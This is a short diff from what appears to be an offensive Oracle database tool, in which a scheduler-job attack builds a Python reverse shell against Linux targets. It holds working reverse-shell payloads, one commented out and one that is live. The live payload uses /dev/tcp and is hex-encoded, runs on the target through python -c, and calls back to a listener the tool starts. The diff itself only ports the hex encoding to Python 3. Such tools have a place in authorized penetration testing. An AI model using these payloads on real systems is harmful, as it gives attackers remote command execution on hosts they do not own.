@@ -127,7 +127,7 @@ class DbmsScheduler (OracleDatabase):
 		elif self.remoteSystemIsLinux() == True :
 			#PYTHON_CODE = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);""".format(localip, localport)
 			PYTHON_CODE = """import os; os.system('exec 5<>/dev/tcp/{0}/{1}; /bin/cat <&5 | while read line; do $line 2>&5 >&5; done');""".format(localip, localport)
-			CMD = '''/usr/bin/python -c exec('{0}'.decode('hex'))'''.format(PYTHON_CODE.encode('hex'))
+			CMD = '''/usr/bin/python -c exec('{0}'.decode('hex'))'''.format(PYTHON_CODE.encode('utf-8').hex())
 			logging.debug('The following command will be executed on the target: {0}'.format(CMD))
 			self.args['print'].goodNews("The python reverse shell tries to connect to {0}:{1}".format(localip,localport))
 			a = Thread(None, self.__runListenNC__, None, (), {'port':localport})
